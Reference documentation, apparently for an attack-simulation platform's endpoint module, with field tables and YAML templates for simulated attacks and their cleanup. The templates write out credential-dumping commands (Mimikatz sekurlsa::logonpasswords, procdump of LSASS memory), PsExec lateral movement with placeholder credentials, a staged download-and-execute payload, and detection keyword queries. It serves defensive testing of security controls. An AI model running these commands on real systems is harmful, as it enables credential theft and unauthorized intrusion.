# Endpoint Module Reference

Applies to: `Endpoint Scenario`, `Linux Endpoint Scenario`, `macOS Endpoint Scenario`,
`Kubernetes Endpoint Scenario`

---

## Action-Level Fields (Endpoint Only)

| Field | Required | Type | Description |
|---|---|---|---|
| `play_processes` | **Yes** | List | Attack processes to execute. At least one required. |
| `rewind_processes` | No | List | Cleanup processes to reverse the attack. Same structure. |
| `is_privileged` | No | Boolean | Whether the action requires elevated privileges. |
| `is_remote` | No | Boolean | Whether the action executes on a remote host (lateral movement). |
| `needs_creds` | No | Boolean | Whether the action requires credentials (lateral movement). |

---

## Process Fields

Each item in `play_processes` or `rewind_processes`:

| Field | Required | Type | Description |
|---|---|---|---|
| `path` | **Yes** | String | Full path to the executable (e.g., `C:\Windows\System32\cmd.exe`). |
| `arguments` | No | String | Command-line arguments passed to the executable. |
| `timeout` | No | Integer | Timeout in seconds before the process is killed. |
| `delay` | No | Integer | Delay in seconds before execution starts. |
| `is_async` | No | Boolean | Run asynchronously (don't wait for process to finish). |
| `remote_files` | No | List | Binary files the process needs. See Remote Files. |
| `success_conditions` | No | List | How to determine if the process succeeded. |

---

## Success Conditions

Each item in `success_conditions`:

| Field | Type | Description |
|---|---|---|
| `code` | Integer | Expected exit code (e.g., `0` for success). |
| `output` | String | Expected text substring in the process output. |
| `is_inverse` | Boolean | When `true`, the condition is negated — process succeeds when condition is NOT met. |

---

## Full Endpoint Action Template

```yaml
- name: action_one
  title: Execute Mimikatz Credential Dump
  description: Dumps credentials using Mimikatz sekurlsa module
  affected_os:
    - Windows
  is_atomic: true
  is_privileged: true
  ukc_phase: Credential Access
  category: Attack Scenario
  tactic: TA0006
  technique: T1003
  sub_technique: T1003.001
  malware_family: Mimikatz
  keyword_queries:
    - (("mimikatz" OR "sekurlsa" OR "lsadump"))
  result_condition:
    "true": unblocked
    "false": blocked
    condition:
      Right:
        Value: unblocked
      Left:
        Value: '%process-1%'
      Operator: eq
  play_processes:
    - path: C:\Windows\System32\cmd.exe
      arguments: /c mimikatz.exe "sekurlsa::logonpasswords" exit
      timeout: 60
      delay: 0
      is_async: false
      remote_files:
        - file: files/mimikatz.exe
          path: C:\Temp\mimikatz.exe
          is_executable: true
          is_downloaded: true
      success_conditions:
        - code: 0
        - output: "sekurlsa::logonpasswords"
          is_inverse: false
  rewind_processes:
    - path: C:\Windows\System32\cmd.exe
      arguments: /c del C:\Temp\mimikatz.exe
      timeout: 30
```

---

## Lateral Movement Action Template (Endpoint Scenario only)

```yaml
- name: lateral_move
  title: Lateral Movement via PsExec
  is_atomic: true
  is_remote: true
  needs_creds: true
  is_privileged: true
  ukc_phase: Lateral Movement
  category: Lateral Movement Techniques (Windows)
  tactic: TA0008
  technique: T1021
  affected_os:
    - Windows
  play_processes:
    - path: C:\Windows\System32\cmd.exe
      arguments: /c psexec.exe \\target -u admin -p pass cmd.exe /c whoami
      timeout: 120
      remote_files:
        - file: files/psexec.exe
          path: C:\Temp\psexec.exe
          is_executable: true
          is_downloaded: true
      success_conditions:
        - code: 0
```

---

## Multi-Process Action Template

An action can have multiple play_processes executed in sequence:

```yaml
- name: multi_stage
  title: Download and Execute Payload
  is_atomic: false
  ukc_phase: Execution
  category: Attack Scenario
  play_processes:
    - path: C:\Windows\System32\cmd.exe
      arguments: /c copy files\stage1.exe C:\Temp\stage1.exe
      timeout: 30
      remote_files:
        - file: files/stage1.exe
          path: C:\Temp\stage1.exe
          is_executable: true
          is_downloaded: true
    - path: C:\Temp\stage1.exe
      arguments: --silent
      timeout: 60
      delay: 5
      success_conditions:
        - code: 0
          is_inverse: false
  rewind_processes:
    - path: C:\Windows\System32\cmd.exe
      arguments: /c del C:\Temp\stage1.exe
      timeout: 15
```

---

## Full Campaign Example — Endpoint Scenario

```yaml
campaign:
  name: APT29 Credential Harvesting Simulation
  module: Endpoint Scenario
  severity: High
  description: Simulates APT29 credential harvesting using LSASS dumping techniques.
  affected_os:
    - Windows
  threat_actor: APT29
  result_condition:
    "true": unblocked
    "false": blocked
    condition:
      Right:
        Value: unblocked
      Left:
        Value: '%objective-1%'
      Operator: eq
  objectives:
    - type: Credential Access
      result_condition:
        "true": unblocked
        "false": blocked
        condition:
          Terms:
            - Right:
                Value: unblocked
              Left:
                Value: '%action-1%'
              Operator: eq
          Operator: and
      actions:
        - name: dump_lsass
          title: Dump LSASS Process Memory
          description: Uses procdump to capture LSASS memory for offline credential extraction
          affected_os:
            - Windows
          is_atomic: true
          is_privileged: true
          ukc_phase: Credential Access
          category: Attack Scenario
          tactic: TA0006
          technique: T1003
          sub_technique: T1003.001
          keyword_queries:
            - (("procdump" OR "lsass.dmp" OR "T1003.001"))
          play_processes:
            - path: C:\Windows\System32\cmd.exe
              arguments: /c procdump.exe -accepteula -ma lsass C:\Temp\lsass.dmp
              timeout: 120
              remote_files:
                - file: files/procdump.exe
                  path: C:\Temp\procdump.exe
                  is_executable: true
                  is_downloaded: true
              success_conditions:
                - code: 0
                - output: "Dump 1 complete"
          rewind_processes:
            - path: C:\Windows\System32\cmd.exe
              arguments: /c del C:\Temp\lsass.dmp & del C:\Temp\procdump.exe
              timeout: 30
```
